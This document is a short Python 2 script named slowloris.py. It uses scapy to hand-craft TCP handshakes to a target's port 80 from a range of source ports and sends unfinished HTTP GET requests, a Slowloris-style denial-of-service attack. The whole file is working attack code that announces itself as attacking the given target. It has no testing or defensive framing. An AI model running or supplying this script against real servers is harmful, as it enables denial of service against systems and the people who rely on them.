#!/usr/bin/env python
import sys
from scapy.all import *

if len(sys.argv) != 4:
    print "Usage: ./slowloris.py <target-ip> <starting-source-port> <number-of-GETs>"
    sys.exit(1)

target = sys.argv[1]
sp = int(sys.argv[2])
numgets = int(sys.argv[3])

print "Attacking ", target, " with ", numgets, " GETs"

i = IP()
i.dst = target
print "IP layer prepared: ", i.summary()

for s in range(sp, sp+numgets-1):
    t = TCP()
    t.dport = 80
    t.sport = s
    t.flags = "S"
    ans = sr1(i/t, verbose=0)
    t.seq = ans.ack
    t.ack = ans.seq + 1
    t.flags = "A"
    get = "GET / HTTP/1.1\r\nHost: " + target
    ans = sr1(i/t/get, verbose=0)
    print "Attacking from port ", s
print "Done!"
